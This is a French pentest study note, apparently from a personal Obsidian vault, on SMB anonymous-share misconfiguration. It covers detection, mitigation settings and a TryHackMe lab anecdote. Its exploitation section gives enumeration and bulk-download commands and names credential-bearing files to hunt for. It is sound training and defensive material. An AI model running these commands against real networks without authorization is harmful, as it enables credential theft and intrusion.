---
tags:
  - vuln/network
cvss: 5.3
category:
  - Information Disclosure
  - Misconfiguration
related_cves: []
creation_date: 2025-10-27
---
# SMB Anonymous Access

## 📋 Description
> Configuration incorrecte de Samba/SMB permettant l'accès à des partages réseau sans authentification. Permet souvent de récupérer des informations sensibles (credentials, listes d'utilisateurs, fichiers de configuration).

---

## 🎯 Impact & Gravité

**CVSS Score :** 5.3 (Medium)
**Niveau de risque :** [X] Moyen [ ] Critique [ ] Élevé [ ] Faible

**Impacts :**
- Fuite d'informations sensibles (credentials, configs)
- Énumération d'utilisateurs
- Découverte de l'architecture réseau
- Possible pivot vers d'autres attaques (bruteforce, exploitation)

---

## 🔍 Détection

**Indicateurs :**
```bash
# Énumération avec enum4linux
enum4linux -a <IP>

# Liste des partages
smbclient -L //<IP> -N

# Nmap NSE scripts
nmap --script smb-enum-shares,smb-enum-users -p 445 <IP>

# CrackMapExec
crackmapexec smb <IP> --shares -u '' -p ''
```

**Outils de scan :**
- enum4linux
- smbclient
- smbmap
- CrackMapExec
- Nmap (scripts NSE)

---

## 💥 Exploitation

**Prérequis :**
- Port 139/445 ouvert
- Configuration SMB permettant l'accès anonyme

**PoC / Commandes :**
```bash
# Connexion anonyme à un partage
smbclient //<IP>/share_name -N

# Télécharger tous les fichiers
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Avec smbmap
smbmap -H <IP> -u anonymous
smbmap -H <IP> -u anonymous -r share_name

# Monter le partage
mount -t cifs //<IP>/share_name /mnt/smb -o username=,password=
```

**Fichiers intéressants à chercher :**
- `*.txt` - Notes, credentials
- `*.xml`, `*.conf`, `*.config` - Fichiers de configuration
- `*.ps1`, `*.bat`, `*.sh` - Scripts (peuvent contenir des creds)
- `*.kdbx` - Bases de mots de passe KeePass

---

## 🛡️ Mitigation & Patch

**Solutions :**
1. Désactiver l'accès guest/anonymous dans `smb.conf`
2. Configurer `map to guest = Never`
3. Forcer l'authentification sur tous les partages
4. Utiliser SMBv3 avec chiffrement

**Configuration sécurisée (smb.conf) :**
```ini
[global]
map to guest = Never
restrict anonymous = 2
guest ok = no
```

**Workarounds :**
- Limiter l'accès SMB par firewall
- Segmenter le réseau
- Monitoring des connexions anonymes

---

## 🔗 Références

- CVE : N/A (Misconfiguration)
- OWASP : A05:2021 – Security Misconfiguration
- Documentation : https://www.samba.org/samba/docs/

---

## 📝 Notes de Terrain

**Rencontré dans :** [[THM - Basic Pentesting]]
**Date :** 2025-10-27
**Contexte :** 
- Partage "Anonymous" accessible sans auth
- Fichier `staff.txt` contenait liste d'utilisateurs
- A permis bruteforce SSH ensuite
